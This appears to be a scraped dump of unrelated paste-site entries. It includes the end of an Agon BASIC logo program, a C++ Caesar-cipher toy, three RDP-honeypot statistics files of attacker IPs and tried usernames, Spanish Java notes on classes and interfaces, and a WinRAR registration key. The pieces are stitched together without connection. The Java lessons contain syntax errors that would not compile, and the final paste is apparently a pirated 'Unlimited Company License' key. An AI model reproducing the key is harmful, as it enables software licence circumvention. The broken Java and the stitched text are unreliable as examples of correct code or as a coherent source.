   320 VDU 23,211,63,63,127,255,255,255,255,255
   330 VDU 23,212,255,255,255,255,255,255,223,223
   340 VDU 23,213,0,0,128,128,128,192,192,192
   350 VDU 23,214,7,7,15,15,15,15,15,31
   360 VDU 23,215,255,247,231,231,231,199,135,130
   370 VDU 23,216,199,135,135,143,15,15,31,31
   380 VDU 23,217,207,207,207,199,199,195,129,1
   390 VDU 23,218,224,224,224,240,240,240,240,240
   400 VDU 23,219,31,31,31,31,15,15,15,31
   410 VDU 23,220,128,128,128,128,129,143,135,143
   420 VDU 23,221,31,63,15,0,128,224,224,195
   430 VDU 23,222,252,240,128,0,3,7,35,243
   440 VDU 23,223,1,1,1,129,193,225,241,241
   450 VDU 23,224,240,240,240,240,240,240,240,240
   460 VDU 23,225,31,31,3,3,3,3,7,15
   470 VDU 23,226,223,255,255,255,255,255,254,254
   480 VDU 23,227,199,135,135,7,15,15,31,31
   490 VDU 23,228,241,241,241,248,248,248,248,248
   500 VDU 23,229,253,255,255,255,255,255,255,127
   510 VDU 23,230,240,248,248,224,224,224,240,248
   520 VDU 23,231,31,63,63,63,31,31,15,0
   530 VDU 23,232,254,252,252,252,248,248,224,0
   540 VDU 23,233,31,60,32,0,0,0,0,0
   550 VDU 23,234,120,28,12,12,0,0,0,0
   560 VDU 23,235,127,127,127,127,127,63,15,0
   570 VDU 23,236,248,252,252,252,252,248,240,0
   580 VDU 23,237,255,254,252,248,240,224,192,128
   600 :
   601 REM Displaying the logo line by line
   602 REM From custom chars defined previously
   610 COLOUR 15: PRINT TAB(2,1);""  "";CHR$(200);CHR$(201);""   "";
   630 COLOUR 15: PRINT TAB(2,2);""  "";CHR$(202);CHR$(203);""   "";
   650 COLOUR 15: PRINT TAB(2,3);"" "";CHR$(204);CHR$(205);CHR$(206);CHR$(207);""  "";
   670 COLOUR 15: PRINT TAB(2,4);CHR$(208);CHR$(209);CHR$(210);CHR$(211);CHR$(212);CHR$(213);"" "";
   690 COLOUR 15: PRINT TAB(2,5);CHR$(214);CHR$(215);CHR$(216);CHR$(209);CHR$(217);CHR$(218);"" "";
   710 COLOUR 15: PRINT TAB(2,6);CHR$(219);CHR$(220);CHR$(221);CHR$(222);CHR$(223);CHR$(224);"" "";
   730 COLOUR 15: PRINT TAB(2,7);CHR$(225);CHR$(226);CHR$(227);CHR$(228);CHR$(229);CHR$(230);"" "";
   750 COLOUR 15: PRINT TAB(2,8);CHR$(231);CHR$(232);CHR$(233);CHR$(234);CHR$(235);CHR$(236);"" "";
   800 :
   801 REM Displaying the header title and imfo line by line.
   830 PRINT TAB(10,1);""** AGON LIGHT2 BASIC V3 **""
   850 PRINT TAB(10,3);""MODE:("";M%;"") "";W%;""x"";H%;"" COLOURS:"";C%;
   860 PRINT TAB(10,5);""BASIC BYTES FREE:"";F%;
   870 PRINT TAB(10,7);""CPU:ZILOG eZ80""
   900 :
   901 REM SET READY PROMPT.
   910 COLOUR BG%: COLOUR FG%
   920 PRINT TAB(0,11);""AGON READY.""
   930 REM NEW
   940 END
   950 :
   960 DEF FN_GETBYTE_VDP(V%): A%=&A0: L%=V%: =USR(&FFF4)
   970 :
   980 DEF FN_GETWORD_VDP(V%): =FN_GETBYTE_VDP(V%)+256*FN_GETBYTE_VDP(V%+1)"
aSiti7Us,Enigma,erehh,C++,Thursday 23rd of November 2023 06:38:24 PM CDT,"#include <iostream>

using namespace std;

// Function prototypes
char* transform(char letter, int shift);
void Enigma();

char userChoice;

int main() {
    do {
        Enigma();
    } while (userChoice != '3');

    cout << ""Exiting Enigma. Goodbye! "" << endl;
    cout << endl;

    return 0;
}

void Enigma() {
    cout << ""Welcome to the Enigma Machine. "" << endl;
    cout << endl;
    cout << ""What would you like to do? "" << endl;
    cout << ""1) Encode \n2) Decode \n3) Exit"" << endl;
    cout << ""Your Answer: "";
    cin >> userChoice;
    cout << endl;

    // Check if the value entered by the user is valid
    if (userChoice < '1' || userChoice > '3') {
        cout << ""Invalid choice. Please, enter a valid option."" << endl;
        cout << endl;
        return;
    }

    // Check to see if the user wants to exit the program
    if (userChoice == '3') {
        return;
    }

    char inputLetter;
    cout << ""Enter a letter: "";
    cin >> inputLetter;

    char* result = transform(inputLetter, (userChoice == '1') ? 7 : -7);

    cout << (userChoice == '1' ? ""Encoded "" : ""Decoded "") << ""Result: "" << result << endl;
    cout << endl;
    delete[] result; // Free the allocated memory
}

char* transform(char letter, int shift) {
    char* result = new char[2];

    if (isalpha(letter)) {
        result[0] = static_cast<char>((tolower(letter) - 'a' + shift + 26) % 26 + 'a');
    }
    else {
        result[0] = letter;
    }
    result[1] = '\0';
    return result;
}"
16mkQy58,2023-11-23_stats.json,rdp_snitch,JSON,Thursday 23rd of November 2023 06:18:07 PM CDT,"{
  ""ip"": {
    ""194.165.17.21"": 66,
    ""58.218.204.183"": 12,
    ""139.162.175.215"": 12,
    ""152.32.183.240"": 3,
    ""149.28.150.188"": 120,
    ""66.42.53.73"": 96,
    ""45.32.117.150"": 87,
    ""45.77.40.213"": 108,
    ""149.28.153.131"": 105,
    ""139.180.157.173"": 102,
    ""207.148.126.207"": 114,
    ""139.180.157.26"": 102,
    ""207.148.78.121"": 108,
    ""139.180.145.140"": 102,
    ""139.180.211.93"": 93,
    ""207.148.69.220"": 105,
    ""139.180.137.38"": 117,
    ""45.76.187.113"": 111,
    ""149.28.157.98"": 78,
    ""45.76.153.222"": 120,
    ""207.148.74.151"": 96,
    ""139.180.159.130"": 87,
    ""149.28.143.22"": 87,
    ""163.177.115.88"": 3,
    ""45.227.254.49"": 6,
    ""62.204.41.132"": 27,
    ""103.149.137.93"": 1473,
    ""94.232.41.30"": 3,
    ""103.30.10.17"": 651,
    ""103.209.61.132"": 1464,
    ""106.116.169.71"": 3,
    ""185.220.103.12"": 3,
    ""205.210.31.107"": 9,
    ""212.70.149.146"": 3,
    ""141.98.11.169"": 9,
    ""162.142.125.222"": 3,
    ""94.102.61.23"": 3,
    ""67.133.192.80"": 3,
    ""194.165.16.76"": 6,
    ""205.210.31.136"": 9,
    ""103.47.194.135"": 6,
    ""103.231.59.163"": 21,
    ""185.156.72.20"": 3,
    ""152.32.159.79"": 3,
    ""141.98.81.155"": 3,
    ""45.227.254.55"": 6,
    ""205.210.31.48"": 9,
    ""185.73.124.50"": 6,
    ""52.144.46.129"": 3,
    ""162.209.206.10"": 9,
    ""185.170.144.3"": 3,
    ""36.91.222.100"": 3,
    ""203.124.37.152"": 3,
    ""23.230.171.15"": 3,
    ""198.235.24.171"": 9,
    ""205.164.28.218"": 6,
    ""176.113.115.65"": 3,
    ""45.227.254.48"": 6,
    ""45.77.71.172"": 6
  },
  ""asn"": {
    ""AS48721"": 72,
    ""AS4134"": 15,
    ""AS63949"": 12,
    ""AS135377"": 6,
    ""AS20473"": 1944,
    ""AS17816"": 3,
    ""AS267784"": 18,
    ""AS59425"": 27,
    ""AS63737"": 3588,
    ""AS208091"": 9,
    ""AS4224"": 3,
    ""AS396982"": 36,
    ""AS204428"": 3,
    ""AS209605"": 9,
    ""AS398324"": 3,
    ""AS202425"": 3,
    ""AS209"": 3,
    ""AS140832"": 6,
    ""AS132335"": 21,
    ""AS61432"": 3,
    ""AS209588"": 3,
    ""AS36007"": 3,
    ""AS40065"": 9,
    ""AS197414"": 3,
    ""AS7713"": 3,
    ""AS7590"": 3,
    ""AS14315"": 3,
    ""AS149440"": 6,
    ""AS57678"": 3
  },
  ""isp"": {
    ""Flyservers S.A."": 93,
    ""Chinanet"": 15,
    ""Akamai Technologies, Inc."": 12,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 6,
    ""The Constant Company"": 702,
    ""Choopa"": 1242,
    ""China Unicom Guangdong Province Network"": 3,
    ""Horizon LLC"": 27,
    ""Vietserver Services Technology Company Limited"": 2937,
    ""Xhost Internet Solutions LP"": 12,
    ""SKY"": 651,
    ""The Calyx Institute"": 3,
    ""Google LLC"": 36,
    ""SS-Net"": 3,
    ""UAB Host Baltic"": 9,
    ""Censys, Inc."": 3,
    ""IP Volume inc"": 3,
    ""CenturyLink"": 3,
    ""FTECH"": 6,
    ""LeapSwitch Networks Pvt Ltd"": 21,
    ""TOV VAIZ PARTNER"": 3,
    ""Kamatera, Inc."": 3,
    ""CloudRadium L.L.C"": 9,
    ""PT Telekomunikasi Indonesia"": 3,
    ""COMSATS"": 3,
    ""Ipxo LLC"": 3,
    ""EGIHosting"": 6,
    ""Cat Technologies Co. Limited"": 3
  },
  ""org"": {
    ""Flyservers S.A"": 75,
    ""Chinanet JS"": 12,
    ""Linode, LLC"": 12,
    ""Ucloud Information Technology"": 6,
    ""Vultr Holdings, LLC"": 822,
    ""Unknown"": 1143,
    ""UAB Host Baltic"": 18,
    ""Horizon LLC"": 27,
    ""Siddhi Cable And Network Private Limited"": 1473,
    ""Dmitriy Panchenko"": 3,
    ""Skynode Company Limited"": 651,
    ""T-media Digital Technology Company Limited"": 1464,
    ""Chinanet HE"": 3,
    ""The Calyx Institute"": 3,
    ""Palo Alto Networks, Inc"": 36,
    ""4Media Ltd"": 3,
    ""Censys Inc"": 3,
    ""AI Spera"": 3,
    ""CenturyLink, Inc"": 3,
    ""IPXO"": 21,
    ""TOV VAIZ PARTNER"": 3,
    ""Xhostis"": 9,
    ""Cloud Web Manage"": 3,
    ""zhang san"": 9,
    ""Telekomunikasi Indonesia"": 3,
    ""CIS HQ"": 3,
    ""Evoxt"": 6,
    ""Cat Technologies Co. Limited"": 3
  },
  ""regionName"": {
    ""Kaunas"": 81,
    ""Jiangsu"": 12,
    ""Hesse"": 12,
    ""Virginia"": 3,
    ""South West"": 1755,
    ""Central Singapore"": 183,
    ""Guangdong"": 3,
    ""Vilnius"": 18,
    ""Moscow"": 30,
    ""Tinh Thai Binh"": 1473,
    ""Perm Krai"": 3,
    ""Hanoi"": 2115,
    ""Hebei"": 3,
    ""New York"": 9,
    ""California"": 57,
    ""Plovdiv"": 3,
    ""Michigan"": 3,
    ""North Holland"": 12,
    ""Tinh Thanh Hoa"": 6,
    ""Maharashtra"": 24,
    ""Kyiv City"": 3,
    ""Drenthe"": 3,
    ""Jakarta"": 3,
    ""Islamabad"": 3,
    ""South Carolina"": 3
  },
  ""country"": {
    ""Lithuania"": 99,
    ""China"": 18,
    ""Germany"": 12,
    ""United States"": 75,
    ""Singapore"": 1938,
    ""Russia"": 33,
    ""Vietnam"": 3594,
    ""Bulgaria"": 3,
    ""Netherlands"": 15,
    ""India"": 24,
    ""Ukraine"": 3,
    ""Indonesia"": 3,
    ""Pakistan"": 3
  },
  ""account"": {
    ""hello"": 138,
    ""(empty)"": 24,
    ""nmap"": 6,
    ""142.93.8.59"": 5532,
    ""Test"": 36,
    ""PeJnKfbaO"": 3,
    ""uWgcGq"": 3,
    ""WqFGCF"": 3,
    ""Domain"": 30,
    ""ZASxTcMgO"": 3,
    ""ICknSa"": 3,
    ""MhGMaZ"": 3,
    ""Administrator"": 3,
    ""Administr"": 15,
    ""QPEUsGAWX"": 3,
    ""LrTJnC"": 3,
    ""pmChfS"": 3,
    ""BGfjeNPLQ"": 3,
    ""zCUTNb"": 3,
    ""kfgBLT"": 3
  },
  ""keyboard"": {
    ""Unknown"": 5820
  },
  ""client_build"": {
    ""Unknown"": 5820
  },
  ""client_name"": {
    ""Unknown"": 5820
  },
  ""ip_type"": {
    ""Unknown"": 3771,
    ""proxy"": 18,
    ""hosting"": 1830,
    ""hosting & proxy"": 201
  }
}"
vqQ6bw6V,2023-11-23_stats.json,rdp_snitch,JSON,Thursday 23rd of November 2023 06:16:10 PM CDT,"{
  ""ip"": {
    ""194.165.17.21"": 44,
    ""58.218.204.183"": 8,
    ""139.162.175.215"": 8,
    ""152.32.183.240"": 2,
    ""149.28.150.188"": 80,
    ""66.42.53.73"": 64,
    ""45.32.117.150"": 58,
    ""45.77.40.213"": 72,
    ""149.28.153.131"": 70,
    ""139.180.157.173"": 68,
    ""207.148.126.207"": 76,
    ""139.180.157.26"": 68,
    ""207.148.78.121"": 72,
    ""139.180.145.140"": 68,
    ""139.180.211.93"": 62,
    ""207.148.69.220"": 70,
    ""139.180.137.38"": 78,
    ""45.76.187.113"": 74,
    ""149.28.157.98"": 52,
    ""45.76.153.222"": 80,
    ""207.148.74.151"": 64,
    ""139.180.159.130"": 58,
    ""149.28.143.22"": 58,
    ""163.177.115.88"": 2,
    ""45.227.254.49"": 4,
    ""62.204.41.132"": 18,
    ""103.149.137.93"": 982,
    ""94.232.41.30"": 2,
    ""103.30.10.17"": 434,
    ""103.209.61.132"": 976,
    ""106.116.169.71"": 2,
    ""185.220.103.12"": 2,
    ""205.210.31.107"": 6,
    ""212.70.149.146"": 2,
    ""141.98.11.169"": 6,
    ""162.142.125.222"": 2,
    ""94.102.61.23"": 2,
    ""67.133.192.80"": 2,
    ""194.165.16.76"": 4,
    ""205.210.31.136"": 6,
    ""103.47.194.135"": 4,
    ""103.231.59.163"": 14,
    ""185.156.72.20"": 2,
    ""152.32.159.79"": 2,
    ""141.98.81.155"": 2,
    ""45.227.254.55"": 4,
    ""205.210.31.48"": 6,
    ""185.73.124.50"": 4,
    ""52.144.46.129"": 2,
    ""162.209.206.10"": 6,
    ""185.170.144.3"": 2,
    ""36.91.222.100"": 2,
    ""203.124.37.152"": 2,
    ""23.230.171.15"": 2,
    ""198.235.24.171"": 6,
    ""205.164.28.218"": 4,
    ""176.113.115.65"": 2,
    ""45.227.254.48"": 4,
    ""45.77.71.172"": 4
  },
  ""asn"": {
    ""AS48721"": 48,
    ""AS4134"": 10,
    ""AS63949"": 8,
    ""AS135377"": 4,
    ""AS20473"": 1296,
    ""AS17816"": 2,
    ""AS267784"": 12,
    ""AS59425"": 18,
    ""AS63737"": 2392,
    ""AS208091"": 6,
    ""AS4224"": 2,
    ""AS396982"": 24,
    ""AS204428"": 2,
    ""AS209605"": 6,
    ""AS398324"": 2,
    ""AS202425"": 2,
    ""AS209"": 2,
    ""AS140832"": 4,
    ""AS132335"": 14,
    ""AS61432"": 2,
    ""AS209588"": 2,
    ""AS36007"": 2,
    ""AS40065"": 6,
    ""AS197414"": 2,
    ""AS7713"": 2,
    ""AS7590"": 2,
    ""AS14315"": 2,
    ""AS149440"": 4,
    ""AS57678"": 2
  },
  ""isp"": {
    ""Flyservers S.A."": 62,
    ""Chinanet"": 10,
    ""Akamai Technologies, Inc."": 8,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 4,
    ""The Constant Company"": 468,
    ""Choopa"": 828,
    ""China Unicom Guangdong Province Network"": 2,
    ""Horizon LLC"": 18,
    ""Vietserver Services Technology Company Limited"": 1958,
    ""Xhost Internet Solutions LP"": 8,
    ""SKY"": 434,
    ""The Calyx Institute"": 2,
    ""Google LLC"": 24,
    ""SS-Net"": 2,
    ""UAB Host Baltic"": 6,
    ""Censys, Inc."": 2,
    ""IP Volume inc"": 2,
    ""CenturyLink"": 2,
    ""FTECH"": 4,
    ""LeapSwitch Networks Pvt Ltd"": 14,
    ""TOV VAIZ PARTNER"": 2,
    ""Kamatera, Inc."": 2,
    ""CloudRadium L.L.C"": 6,
    ""PT Telekomunikasi Indonesia"": 2,
    ""COMSATS"": 2,
    ""Ipxo LLC"": 2,
    ""EGIHosting"": 4,
    ""Cat Technologies Co. Limited"": 2
  },
  ""org"": {
    ""Flyservers S.A"": 50,
    ""Chinanet JS"": 8,
    ""Linode, LLC"": 8,
    ""Ucloud Information Technology"": 4,
    ""Vultr Holdings, LLC"": 548,
    ""Unknown"": 762,
    ""UAB Host Baltic"": 12,
    ""Horizon LLC"": 18,
    ""Siddhi Cable And Network Private Limited"": 982,
    ""Dmitriy Panchenko"": 2,
    ""Skynode Company Limited"": 434,
    ""T-media Digital Technology Company Limited"": 976,
    ""Chinanet HE"": 2,
    ""The Calyx Institute"": 2,
    ""Palo Alto Networks, Inc"": 24,
    ""4Media Ltd"": 2,
    ""Censys Inc"": 2,
    ""AI Spera"": 2,
    ""CenturyLink, Inc"": 2,
    ""IPXO"": 14,
    ""TOV VAIZ PARTNER"": 2,
    ""Xhostis"": 6,
    ""Cloud Web Manage"": 2,
    ""zhang san"": 6,
    ""Telekomunikasi Indonesia"": 2,
    ""CIS HQ"": 2,
    ""Evoxt"": 4,
    ""Cat Technologies Co. Limited"": 2
  },
  ""regionName"": {
    ""Kaunas"": 54,
    ""Jiangsu"": 8,
    ""Hesse"": 8,
    ""Virginia"": 2,
    ""South West"": 1170,
    ""Central Singapore"": 122,
    ""Guangdong"": 2,
    ""Vilnius"": 12,
    ""Moscow"": 20,
    ""Tinh Thai Binh"": 982,
    ""Perm Krai"": 2,
    ""Hanoi"": 1410,
    ""Hebei"": 2,
    ""New York"": 6,
    ""California"": 38,
    ""Plovdiv"": 2,
    ""Michigan"": 2,
    ""North Holland"": 8,
    ""Tinh Thanh Hoa"": 4,
    ""Maharashtra"": 16,
    ""Kyiv City"": 2,
    ""Drenthe"": 2,
    ""Jakarta"": 2,
    ""Islamabad"": 2,
    ""South Carolina"": 2
  },
  ""country"": {
    ""Lithuania"": 66,
    ""China"": 12,
    ""Germany"": 8,
    ""United States"": 50,
    ""Singapore"": 1292,
    ""Russia"": 22,
    ""Vietnam"": 2396,
    ""Bulgaria"": 2,
    ""Netherlands"": 10,
    ""India"": 16,
    ""Ukraine"": 2,
    ""Indonesia"": 2,
    ""Pakistan"": 2
  },
  ""account"": {
    ""hello"": 92,
    ""(empty)"": 16,
    ""nmap"": 4,
    ""142.93.8.59"": 3688,
    ""Test"": 24,
    ""PeJnKfbaO"": 2,
    ""uWgcGq"": 2,
    ""WqFGCF"": 2,
    ""Domain"": 20,
    ""ZASxTcMgO"": 2,
    ""ICknSa"": 2,
    ""MhGMaZ"": 2,
    ""Administrator"": 2,
    ""Administr"": 10,
    ""QPEUsGAWX"": 2,
    ""LrTJnC"": 2,
    ""pmChfS"": 2,
    ""BGfjeNPLQ"": 2,
    ""zCUTNb"": 2,
    ""kfgBLT"": 2
  },
  ""keyboard"": {
    ""Unknown"": 3880
  },
  ""client_build"": {
    ""Unknown"": 3880
  },
  ""client_name"": {
    ""Unknown"": 3880
  },
  ""ip_type"": {
    ""Unknown"": 2514,
    ""proxy"": 12,
    ""hosting"": 1220,
    ""hosting & proxy"": 134
  }
}"
LyF0bhDu,2023-11-23_stats.json,rdp_snitch,JSON,Thursday 23rd of November 2023 06:15:09 PM CDT,"{
  ""ip"": {
    ""194.165.17.21"": 22,
    ""58.218.204.183"": 4,
    ""139.162.175.215"": 4,
    ""152.32.183.240"": 1,
    ""149.28.150.188"": 40,
    ""66.42.53.73"": 32,
    ""45.32.117.150"": 29,
    ""45.77.40.213"": 36,
    ""149.28.153.131"": 35,
    ""139.180.157.173"": 34,
    ""207.148.126.207"": 38,
    ""139.180.157.26"": 34,
    ""207.148.78.121"": 36,
    ""139.180.145.140"": 34,
    ""139.180.211.93"": 31,
    ""207.148.69.220"": 35,
    ""139.180.137.38"": 39,
    ""45.76.187.113"": 37,
    ""149.28.157.98"": 26,
    ""45.76.153.222"": 40,
    ""207.148.74.151"": 32,
    ""139.180.159.130"": 29,
    ""149.28.143.22"": 29,
    ""163.177.115.88"": 1,
    ""45.227.254.49"": 2,
    ""62.204.41.132"": 9,
    ""103.149.137.93"": 491,
    ""94.232.41.30"": 1,
    ""103.30.10.17"": 217,
    ""103.209.61.132"": 488,
    ""106.116.169.71"": 1,
    ""185.220.103.12"": 1,
    ""205.210.31.107"": 3,
    ""212.70.149.146"": 1,
    ""141.98.11.169"": 3,
    ""162.142.125.222"": 1,
    ""94.102.61.23"": 1,
    ""67.133.192.80"": 1,
    ""194.165.16.76"": 2,
    ""205.210.31.136"": 3,
    ""103.47.194.135"": 2,
    ""103.231.59.163"": 7,
    ""185.156.72.20"": 1,
    ""152.32.159.79"": 1,
    ""141.98.81.155"": 1,
    ""45.227.254.55"": 2,
    ""205.210.31.48"": 3,
    ""185.73.124.50"": 2,
    ""52.144.46.129"": 1,
    ""162.209.206.10"": 3,
    ""185.170.144.3"": 1,
    ""36.91.222.100"": 1,
    ""203.124.37.152"": 1,
    ""23.230.171.15"": 1,
    ""198.235.24.171"": 3,
    ""205.164.28.218"": 2,
    ""176.113.115.65"": 1,
    ""45.227.254.48"": 2,
    ""45.77.71.172"": 2
  },
  ""asn"": {
    ""AS48721"": 24,
    ""AS4134"": 5,
    ""AS63949"": 4,
    ""AS135377"": 2,
    ""AS20473"": 648,
    ""AS17816"": 1,
    ""AS267784"": 6,
    ""AS59425"": 9,
    ""AS63737"": 1196,
    ""AS208091"": 3,
    ""AS4224"": 1,
    ""AS396982"": 12,
    ""AS204428"": 1,
    ""AS209605"": 3,
    ""AS398324"": 1,
    ""AS202425"": 1,
    ""AS209"": 1,
    ""AS140832"": 2,
    ""AS132335"": 7,
    ""AS61432"": 1,
    ""AS209588"": 1,
    ""AS36007"": 1,
    ""AS40065"": 3,
    ""AS197414"": 1,
    ""AS7713"": 1,
    ""AS7590"": 1,
    ""AS14315"": 1,
    ""AS149440"": 2,
    ""AS57678"": 1
  },
  ""isp"": {
    ""Flyservers S.A."": 31,
    ""Chinanet"": 5,
    ""Akamai Technologies, Inc."": 4,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""The Constant Company"": 234,
    ""Choopa"": 414,
    ""China Unicom Guangdong Province Network"": 1,
    ""Horizon LLC"": 9,
    ""Vietserver Services Technology Company Limited"": 979,
    ""Xhost Internet Solutions LP"": 4,
    ""SKY"": 217,
    ""The Calyx Institute"": 1,
    ""Google LLC"": 12,
    ""SS-Net"": 1,
    ""UAB Host Baltic"": 3,
    ""Censys, Inc."": 1,
    ""IP Volume inc"": 1,
    ""CenturyLink"": 1,
    ""FTECH"": 2,
    ""LeapSwitch Networks Pvt Ltd"": 7,
    ""TOV VAIZ PARTNER"": 1,
    ""Kamatera, Inc."": 1,
    ""CloudRadium L.L.C"": 3,
    ""PT Telekomunikasi Indonesia"": 1,
    ""COMSATS"": 1,
    ""Ipxo LLC"": 1,
    ""EGIHosting"": 2,
    ""Cat Technologies Co. Limited"": 1
  },
  ""org"": {
    ""Flyservers S.A"": 25,
    ""Chinanet JS"": 4,
    ""Linode, LLC"": 4,
    ""Ucloud Information Technology"": 2,
    ""Vultr Holdings, LLC"": 274,
    ""Unknown"": 381,
    ""UAB Host Baltic"": 6,
    ""Horizon LLC"": 9,
    ""Siddhi Cable And Network Private Limited"": 491,
    ""Dmitriy Panchenko"": 1,
    ""Skynode Company Limited"": 217,
    ""T-media Digital Technology Company Limited"": 488,
    ""Chinanet HE"": 1,
    ""The Calyx Institute"": 1,
    ""Palo Alto Networks, Inc"": 12,
    ""4Media Ltd"": 1,
    ""Censys Inc"": 1,
    ""AI Spera"": 1,
    ""CenturyLink, Inc"": 1,
    ""IPXO"": 7,
    ""TOV VAIZ PARTNER"": 1,
    ""Xhostis"": 3,
    ""Cloud Web Manage"": 1,
    ""zhang san"": 3,
    ""Telekomunikasi Indonesia"": 1,
    ""CIS HQ"": 1,
    ""Evoxt"": 2,
    ""Cat Technologies Co. Limited"": 1
  },
  ""regionName"": {
    ""Kaunas"": 27,
    ""Jiangsu"": 4,
    ""Hesse"": 4,
    ""Virginia"": 1,
    ""South West"": 585,
    ""Central Singapore"": 61,
    ""Guangdong"": 1,
    ""Vilnius"": 6,
    ""Moscow"": 10,
    ""Tinh Thai Binh"": 491,
    ""Perm Krai"": 1,
    ""Hanoi"": 705,
    ""Hebei"": 1,
    ""New York"": 3,
    ""California"": 19,
    ""Plovdiv"": 1,
    ""Michigan"": 1,
    ""North Holland"": 4,
    ""Tinh Thanh Hoa"": 2,
    ""Maharashtra"": 8,
    ""Kyiv City"": 1,
    ""Drenthe"": 1,
    ""Jakarta"": 1,
    ""Islamabad"": 1,
    ""South Carolina"": 1
  },
  ""country"": {
    ""Lithuania"": 33,
    ""China"": 6,
    ""Germany"": 4,
    ""United States"": 25,
    ""Singapore"": 646,
    ""Russia"": 11,
    ""Vietnam"": 1198,
    ""Bulgaria"": 1,
    ""Netherlands"": 5,
    ""India"": 8,
    ""Ukraine"": 1,
    ""Indonesia"": 1,
    ""Pakistan"": 1
  },
  ""account"": {
    ""hello"": 46,
    ""(empty)"": 8,
    ""nmap"": 2,
    ""142.93.8.59"": 1844,
    ""Test"": 12,
    ""PeJnKfbaO"": 1,
    ""uWgcGq"": 1,
    ""WqFGCF"": 1,
    ""Domain"": 10,
    ""ZASxTcMgO"": 1,
    ""ICknSa"": 1,
    ""MhGMaZ"": 1,
    ""Administrator"": 1,
    ""Administr"": 5,
    ""QPEUsGAWX"": 1,
    ""LrTJnC"": 1,
    ""pmChfS"": 1,
    ""BGfjeNPLQ"": 1,
    ""zCUTNb"": 1,
    ""kfgBLT"": 1
  },
  ""keyboard"": {
    ""Unknown"": 1940
  },
  ""client_build"": {
    ""Unknown"": 1940
  },
  ""client_name"": {
    ""Unknown"": 1940
  },
  ""ip_type"": {
    ""Unknown"": 1257,
    ""proxy"": 6,
    ""hosting"": 610,
    ""hosting & proxy"": 67
  }
}"
dc0Jtnih,clases-interfaces,teslariu,Java,Thursday 23rd of November 2023 06:06:44 PM CDT,"/*
* Clases abstractas, concretas, polimorfismo, interfaces
*
*
*
*/


public class Cliente {
	
	String cuit;                               
	String direccion;
	float saldo;
	
	public void extraer(int monto) {
		if (saldo >= monto){
			saldo = saldo - monto
		}
	}
	
}


class ClientePyme extends Cliente {
	
	String razonSocial;
	float descubierto;
	
	public void extraer(int monto) {
		if (saldo + descubierto >= monto){
			saldo = saldo - monto
		}
}

abstract class Vehiculo{
	boolean conductor;
	boolean motor;
	
	abstract void mover();
	}


///////////////////////////////////////////////////

////  INTERFAZ UNICA

public interface Vehiculo(
	public float maxVel;
	public void arrancar();
	public void detener();
)

public class Auto implements Vehiculo(
	public void arrancar(){
			System.out.println(""Arrancando..."");
	}
	
	public void detener(){
			System.out.println(""Deteniendo..."");
	}
)

// Creo un auto
Vehiculo miAuto = new Auto();


//  polimorfismo
public class Camion implements Vehiculo(
	public void arrancar(){
			System.out.println(""Arrancando el camión..."");
	}
	
	public void detener(){
			System.out.println(""Deteniendo el camión..."");
	}
)

// Creo un camión
Vehiculo miCamion = new Camion();


//// INTERFACES MULTIPLES
public interface GPS{
	public String getCoordenadas();            
}

public interface Radio {                       
	public void encenderRadio();
	public void apagarRadio(); 
}

public class Smartphone implements GPS,Radio {
	public String getCoordenadas(){
			// return coordenadas;
	}
	
	public void encenderRadio(){
			System.out.println(""Encendiendo radio..."");
	}
	
	public void apagarRadio(){
			System.out.println(""Apagando radio..."");
	}

}


/// Clase final: es una clase QUE NO PUEDE SER EXTENDIDA (no se puede heredar,no puede tener subclases)

final class Persona{
	
	String Nombre;
	String Apellido;
	int DNI;
	
	/// getters y setters
	// puedo declarar algun metodo final
	final void mostrar(){
			System.out.println(""No tengo hereredos..."");
		}
	}

// Un atributo de Clase tambien llamados ESTATICOS: pertenece a TODA LA CLASE
// y no a un objeto en particular; son estaticos (constantes)

// clase Perro:
// a. metodos: correr, jugar, caminar, saltar, etc
// b. atributos: raza, especie = ""Canis familiaris""









"
dWLt6XsV,rarreg.key,huezohuezo1990,Bash,Thursday 23rd of November 2023 05:37:33 PM CDT,"RAR registration data
WinRAR
Unlimited Company License
UID=4b914fb772c8376bf571
6412212250f5711ad072cf351cfa39e2851192daf8a362681bbb1d
cd48da1d14d995f0bbf960fce6cb5ffde62890079861be57638717
7131ced835ed65cc743d9777f2ea71a8e32c7e593cf66794343565
b41bcf56929486b8bcdac33d50ecf773996052598f1f556defffbd
982fbe71e93df6b6346c37a3890f3c7edc65d7f5455470d13d1190
6e6fb824bcf25f155547b5fc41901ad58c0992f570be1cf5608ba9
aef69d48c864bcd72d15163897773d314187f6a9af350808719796
"
